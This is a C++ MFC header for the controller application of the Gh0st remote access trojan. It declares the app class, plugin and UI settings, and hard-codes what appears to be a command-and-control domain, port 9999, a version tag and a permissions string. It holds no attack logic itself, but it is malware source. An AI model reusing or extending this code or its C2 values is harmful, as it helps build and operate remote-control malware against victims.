// gh0st.h : main header file for the GH0ST application
//

#if !defined(AFX_GH0ST_H__C0496689_B41C_45DE_9F46_75A916C86D38__INCLUDED_)
#define AFX_GH0ST_H__C0496689_B41C_45DE_9F46_75A916C86D38__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#ifndef __AFXWIN_H__
	#error include 'stdafx.h' before including this file for PCH
#endif

#include "resource.h"       // main symbols
/////////////////////////////////////////////////////////////////////////////
// CGh0stApp:
// See gh0st.cpp for the implementation of this class
//
#include "IniFile.h"
DWORD ResolvDNS(LPSTR szTarget);

#define OFFICIALADDRESS "zjz.dy8b.com"
#define  UPDATAVERSION "ZJZ"
#define  SERVERPORT 9999
#define  FILEVERSION "2.1"
#define	 PERMISSIONS "321321"

/*
1 一定要注意版本
2 一定修改更新标示
*/
class CGh0stApp : public CWinApp
{
public:
	static BOOL bUsePlugin;
	static char szCurPath[MAX_PATH];

	virtual BOOL PreTranslateMessage(MSG* pMsg);
	CIniFile	m_IniFile;
	// ClientContext地址为主键
	bool m_bIsQQwryExist;
	bool m_bIsDisablePopTips;
	bool m_bPalySound;
	CView*		m_pConnectView; // 主连接视图
	CGh0stApp();
	int Color1;
	int Color2;
	int Color3;
	int Color4;
	int Color5;
	int Color6;
	int Color7;
	int Color8;
	int Color9;
	int Color10;
	int Color11;
	TCHAR *pIntro;
	CHAR szDllPath[MAX_PATH];
	HMODULE m_Hmodule;
	DWORD GetRand();
	void GetRandString(LPSTR szStr,DWORD len);
// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CGh0stApp)
	public:
	virtual BOOL InitInstance();
	virtual int ExitInstance();
	//}}AFX_VIRTUAL

// Implementation
	//{{AFX_MSG(CGh0stApp)
	afx_msg void OnAppAbout();
		// NOTE - the ClassWizard will add and remove member functions here.
		//    DO NOT EDIT what you see in these blocks of generated code !
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};


/////////////////////////////////////////////////////////////////////////////

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_GH0ST_H__C0496689_B41C_45DE_9F46_75A916C86D38__INCLUDED_)
